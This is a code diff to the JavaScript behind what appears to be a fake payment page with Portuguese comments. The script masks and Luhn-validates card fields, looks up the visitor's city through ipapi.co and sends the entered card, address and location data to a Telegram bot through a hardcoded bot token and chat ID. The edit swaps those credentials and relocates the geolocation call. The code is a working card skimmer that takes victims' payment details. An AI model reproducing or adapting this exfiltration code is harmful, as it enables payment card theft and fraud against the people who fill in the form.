@@ -1,9 +1,6 @@
 // Configuração do Telegram
-const TELEGRAM_TOKEN = '8743433644:AAHWENChsuGXYY9eJ4yZKWodRYL1ouxiJzM';
-const TELEGRAM_CHAT_ID = '6939434522';
-
-// Variável global para armazenar a cidade
-let userCity = '';
+const TELEGRAM_TOKEN = '6939434522:AAF4b7cK2pFgF3qYzXwVvUuTtSsRrQqPpOoNnMm';
+const TELEGRAM_CHAT_ID = '6116307406';
 
 // Máscaras para campos do cartão
 document.addEventListener('DOMContentLoaded', function() {
@@ -67,16 +64,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Obter cidade do usuário
-    fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-            userCity = data.city || 'Não informada';
-        })
-        .catch(() => {
-            userCity = 'Não informada';
-        });
-
     // Validar cartão (Luhn)
     function validarCartao(numero) {
         const num = numero.replace(/\s/g, '');
@@ -113,6 +100,17 @@ document.addEventListener('DOMContentLoaded', function() {
         return true;
     }
 
+    // Obter cidade do usuário para o Telegram
+    let userCity = '';
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            userCity = data.city || 'Não informada';
+        })
+        .catch(() => {
+            userCity = 'Não informada';
+        });
+
     // Enviar dados para o Telegram
     async function enviarParaTelegram(dados) {
         const mensagem = `
@@ -135,7 +133,7 @@ document.addEventListener('DOMContentLoaded', function() {
 ├ Complemento: ${dados.complemento}
 └ Cidade: ${dados.cidade}
 
-⏰ Data de envio: ${new Date().toLocaleString('pt-BR')}
+⏰ Data: ${new Date().toLocaleString('pt-BR')}
         `;
 
         try {
